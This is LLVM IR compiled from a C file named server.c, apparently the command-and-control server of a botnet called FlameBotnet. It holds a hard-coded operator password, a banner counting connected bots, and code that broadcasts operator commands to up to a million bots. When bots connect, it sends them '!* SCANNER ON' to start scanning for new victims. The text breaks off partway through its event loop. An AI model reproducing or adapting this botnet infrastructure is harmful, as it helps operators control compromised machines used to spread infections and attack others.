; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"dup client\0A\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"DUP\0A\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.11 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.13 = private unnamed_addr constant [7 x i8] c"BUILD \00", align 1
@.str.14 = private unnamed_addr constant [21 x i8] c"build bigger then 6\0A\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.16 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.17 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.18 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.19 = private unnamed_addr constant [50 x i8] c"%c]0;Bots connected: %d | Clients connected: %d%c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.20 = private unnamed_addr constant [11 x i8] c"password: \00", align 1
@.str.21 = private unnamed_addr constant [12 x i8] c"FlameBotnet\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.23 = private unnamed_addr constant [49 x i8] c"\1B[31m*****************************************\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [44 x i8] c"*        WELCOME TO THE BALL PIT        *\0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [53 x i8] c"*     Now with \1B[32mFlameBotnet\1B[31m support     *\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [52 x i8] c"*****************************************\0D\0A\0D\0A> \1B[0m\00", align 1
@.str.27 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.28 = private unnamed_addr constant [18 x i8] c"management: \22%s\22\0A\00", align 1
@.str.29 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.30 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.31 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.32 = private unnamed_addr constant [28 x i8] c"Usage: %s [port] [threads]\0A\00", align 1
@.str.33 = private unnamed_addr constant [11 x i8] c"output.txt\00", align 1
@.str.34 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.35 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.36 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.37 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.38 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.39 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.40 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca %struct.tm*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 1, i32* %5, align 4
  %11 = load i8*, i8** %3, align 8
  %12 = call i32 @strcmp(i8* %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %14, label %15

14:                                               ; preds = %2
  store i32 0, i32* %5, align 4
  br label %15

15:                                               ; preds = %14, %2
  %16 = load i8*, i8** %3, align 8
  %17 = call i64 @strlen(i8* %16) #8
  %18 = add i64 %17, 10
  %19 = call noalias align 16 i8* @malloc(i64 %18) #9
  store i8* %19, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = load i8*, i8** %3, align 8
  %22 = call i64 @strlen(i8* %21) #8
  %23 = add i64 %22, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %20, i8 0, i64 %23, i1 false)
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %3, align 8
  %26 = call i8* @strcpy(i8* %24, i8* %25) #9
  %27 = load i8*, i8** %6, align 8
  call void @trim(i8* %27)
  %28 = call i64 @time(i64* %7) #9
  %29 = call %struct.tm* @localtime(i64* %7) #9
  store %struct.tm* %29, %struct.tm** %8, align 8
  %30 = load %struct.tm*, %struct.tm** %8, align 8
  %31 = call i8* @asctime(%struct.tm* %30) #9
  store i8* %31, i8** %9, align 8
  %32 = load i8*, i8** %9, align 8
  call void @trim(i8* %32)
  store i32 0, i32* %10, align 4
  br label %33

33:                                               ; preds = %102, %15
  %34 = load i32, i32* %10, align 4
  %35 = icmp slt i32 %34, 1000000
  br i1 %35, label %36, label %105

36:                                               ; preds = %33
  %37 = load i32, i32* %10, align 4
  %38 = load i32, i32* %4, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %57, label %40

40:                                               ; preds = %36
  %41 = load i32, i32* %10, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %42
  %44 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %43, i32 0, i32 2
  %45 = load i8, i8* %44, align 1
  %46 = icmp ne i8 %45, 0
  br i1 %46, label %58, label %47

47:                                               ; preds = %40
  %48 = load i32, i32* %5, align 4
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %57, label %50

50:                                               ; preds = %47
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %52
  %54 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %58, label %57

57:                                               ; preds = %50, %47, %36
  br label %102

58:                                               ; preds = %50, %40
  %59 = load i32, i32* %5, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %78

61:                                               ; preds = %58
  %62 = load i32, i32* %10, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %63
  %65 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %64, i32 0, i32 0
  %66 = load i32, i32* %65, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %78

68:                                               ; preds = %61
  %69 = load i32, i32* %10, align 4
  %70 = call i64 @send(i32 %69, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384)
  %71 = load i32, i32* %10, align 4
  %72 = load i8*, i8** %9, align 8
  %73 = load i8*, i8** %9, align 8
  %74 = call i64 @strlen(i8* %73) #8
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %10, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %78

78:                                               ; preds = %68, %61, %58
  %79 = load i32, i32* %10, align 4
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %79)
  %81 = load i32, i32* %10, align 4
  %82 = load i8*, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = call i64 @strlen(i8* %83) #8
  %85 = call i64 @send(i32 %81, i8* %82, i64 %84, i32 16384)
  %86 = load i32, i32* %5, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %98

88:                                               ; preds = %78
  %89 = load i32, i32* %10, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %90
  %92 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %91, i32 0, i32 0
  %93 = load i32, i32* %92, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %88
  %96 = load i32, i32* %10, align 4
  %97 = call i64 @send(i32 %96, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i64 13, i32 16384)
  br label %101

98:                                               ; preds = %88, %78
  %99 = load i32, i32* %10, align 4
  %100 = call i64 @send(i32 %99, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384)
  br label %101

101:                                              ; preds = %98, %95
  br label %102

102:                                              ; preds = %101, %57
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  br label %33, !llvm.loop !11

105:                                              ; preds = %33
  %106 = load i8*, i8** %6, align 8
  call void @free(i8* %106) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %20 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %21 = bitcast i8* %20 to %struct.epoll_event*
  store %struct.epoll_event* %21, %struct.epoll_event** %4, align 8
  br label %22

22:                                               ; preds = %1, %309
  %23 = load volatile i32, i32* @epollFD, align 4
  %24 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %25 = call i32 @epoll_wait(i32 %23, %struct.epoll_event* %24, i32 1000000, i32 -1)
  store i32 %25, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %26

26:                                               ; preds = %306, %22
  %27 = load i32, i32* %7, align 4
  %28 = load i32, i32* %6, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %309

30:                                               ; preds = %26
  %31 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %31, i64 %33
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 1
  %37 = and i32 %36, 8
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %57, label %39

39:                                               ; preds = %30
  %40 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %40, i64 %42
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 1
  %46 = and i32 %45, 16
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %57, label %48

48:                                               ; preds = %39
  %49 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %50 = load i32, i32* %7, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %49, i64 %51
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %52, i32 0, i32 0
  %54 = load i32, i32* %53, align 1
  %55 = and i32 %54, 1
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %76, label %57

57:                                               ; preds = %48, %39, %30
  %58 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %58, i64 %60
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %61, i32 0, i32 1
  %63 = bitcast %union.epoll_data* %62 to i32*
  %64 = load i32, i32* %63, align 1
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %66, i32 0, i32 2
  store i8 0, i8* %67, align 1
  %68 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %69 = load i32, i32* %7, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %68, i64 %70
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %71, i32 0, i32 1
  %73 = bitcast %union.epoll_data* %72 to i32*
  %74 = load i32, i32* %73, align 1
  %75 = call i32 @close(i32 %74)
  br label %306

76:                                               ; preds = %48
  %77 = load volatile i32, i32* @listenFD, align 4
  %78 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %79 = load i32, i32* %7, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %78, i64 %80
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %81, i32 0, i32 1
  %83 = bitcast %union.epoll_data* %82 to i32*
  %84 = load i32, i32* %83, align 1
  %85 = icmp eq i32 %77, %84
  br i1 %85, label %86, label %193

86:                                               ; preds = %76
  br label %87

87:                                               ; preds = %86, %151, %158, %161, %185
  store i32 16, i32* %9, align 4
  %88 = load volatile i32, i32* @listenFD, align 4
  %89 = call i32 @accept(i32 %88, %struct.sockaddr* %8, i32* %9)
  store i32 %89, i32* %10, align 4
  %90 = load i32, i32* %10, align 4
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %102

92:                                               ; preds = %87
  %93 = call i32* @__errno_location() #10
  %94 = load i32, i32* %93, align 4
  %95 = icmp eq i32 %94, 11
  br i1 %95, label %100, label %96

96:                                               ; preds = %92
  %97 = call i32* @__errno_location() #10
  %98 = load i32, i32* %97, align 4
  %99 = icmp eq i32 %98, 11
  br i1 %99, label %100, label %101

100:                                              ; preds = %96, %92
  br label %192

101:                                              ; preds = %96
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %192

102:                                              ; preds = %87
  %103 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %103, i32 0, i32 2
  %105 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 2
  %107 = load i32, i32* %10, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %108
  %110 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %109, i32 0, i32 0
  store i32 %106, i32* %110, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %111

111:                                              ; preds = %140, %102
  %112 = load i32, i32* %11, align 4
  %113 = icmp slt i32 %112, 1000000
  br i1 %113, label %114, label %143

114:                                              ; preds = %111
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %116
  %118 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %117, i32 0, i32 2
  %119 = load i8, i8* %118, align 1
  %120 = icmp ne i8 %119, 0
  br i1 %120, label %121, label %125

121:                                              ; preds = %114
  %122 = load i32, i32* %11, align 4
  %123 = load i32, i32* %10, align 4
  %124 = icmp eq i32 %122, %123
  br i1 %124, label %125, label %126

125:                                              ; preds = %121, %114
  br label %140

126:                                              ; preds = %121
  %127 = load i32, i32* %11, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %128
  %130 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 4
  %132 = load i32, i32* %10, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %133
  %135 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %134, i32 0, i32 0
  %136 = load i32, i32* %135, align 4
  %137 = icmp eq i32 %131, %136
  br i1 %137, label %138, label %139

138:                                              ; preds = %126
  store i32 1, i32* %12, align 4
  br label %143

139:                                              ; preds = %126
  br label %140

140:                                              ; preds = %139, %125
  %141 = load i32, i32* %11, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %11, align 4
  br label %111, !llvm.loop !12

143:                                              ; preds = %138, %111
  %144 = load i32, i32* %12, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %164

146:                                              ; preds = %143
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0), i64 13, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %146
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %87

154:                                              ; preds = %146
  %155 = load i32, i32* %10, align 4
  %156 = call i64 @send(i32 %155, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i64 4, i32 16384)
  %157 = icmp eq i64 %156, -1
  br i1 %157, label %158, label %161

158:                                              ; preds = %154
  %159 = load i32, i32* %10, align 4
  %160 = call i32 @close(i32 %159)
  br label %87

161:                                              ; preds = %154
  %162 = load i32, i32* %10, align 4
  %163 = call i32 @close(i32 %162)
  br label %87

164:                                              ; preds = %143
  %165 = load i32, i32* %10, align 4
  %166 = call i32 @make_socket_non_blocking(i32 %165)
  store i32 %166, i32* %5, align 4
  %167 = load i32, i32* %5, align 4
  %168 = icmp eq i32 %167, -1
  br i1 %168, label %169, label %172

169:                                              ; preds = %164
  %170 = load i32, i32* %10, align 4
  %171 = call i32 @close(i32 %170)
  br label %192

172:                                              ; preds = %164
  %173 = load i32, i32* %10, align 4
  %174 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %175 = bitcast %union.epoll_data* %174 to i32*
  store i32 %173, i32* %175, align 1
  %176 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %176, align 1
  %177 = load volatile i32, i32* @epollFD, align 4
  %178 = load i32, i32* %10, align 4
  %179 = call i32 @epoll_ctl(i32 %177, i32 1, i32 %178, %struct.epoll_event* %3) #9
  store i32 %179, i32* %5, align 4
  %180 = load i32, i32* %5, align 4
  %181 = icmp eq i32 %180, -1
  br i1 %181, label %182, label %185

182:                                              ; preds = %172
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  %183 = load i32, i32* %10, align 4
  %184 = call i32 @close(i32 %183)
  br label %192

185:                                              ; preds = %172
  %186 = load i32, i32* %10, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %187
  %189 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %188, i32 0, i32 2
  store i8 1, i8* %189, align 1
  %190 = load i32, i32* %10, align 4
  %191 = call i64 @send(i32 %190, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0), i64 14, i32 16384)
  br label %87

192:                                              ; preds = %182, %169, %101, %100
  br label %306

193:                                              ; preds = %76
  %194 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %195 = load i32, i32* %7, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %194, i64 %196
  %198 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %197, i32 0, i32 1
  %199 = bitcast %union.epoll_data* %198 to i32*
  %200 = load i32, i32* %199, align 1
  store i32 %200, i32* %13, align 4
  %201 = load i32, i32* %13, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %202
  store %struct.clientdata_t* %203, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %204 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %205 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %204, i32 0, i32 2
  store i8 1, i8* %205, align 1
  br label %206

206:                                              ; preds = %193, %294
  %207 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %207, i8 0, i64 2048, i1 false)
  br label %208

208:                                              ; preds = %277, %276, %263, %249, %234, %206
